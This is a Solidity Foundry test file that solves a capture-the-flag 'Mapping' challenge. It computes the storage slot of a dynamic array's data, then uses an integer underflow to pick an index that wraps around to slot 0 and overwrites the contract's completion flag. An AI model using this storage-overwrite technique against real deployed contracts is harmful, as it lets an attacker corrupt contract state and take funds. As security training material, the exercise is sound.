// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";

interface IMappingChallenge {
    function isComplete() external returns (bool);

    function set(uint256 key, uint256 value) external;
}

interface IMappingChallengeFactory {
    function createChallenge() external returns (address);
}

contract MappingTest is Test {
    IMappingChallenge public challenge;

    function setUp() public {
        address factoryAddress = deployCode("MappingChallengeFactory.sol:MappingChallengeFactory");
        address challengeAddress = IMappingChallengeFactory(factoryAddress).createChallenge();
        challenge = IMappingChallenge(challengeAddress);
    }

    function test() public {
        // Calculating index of the slot which stores first element of map array
        // (slot with index 1 stores map array header)
        uint256 slotIndex = uint256(keccak256(abi.encode(1)));
        // Underflow
        uint256 index = 0 - slotIndex;
        challenge.set(index, 1);

        assertTrue(challenge.isComplete());
    }
}
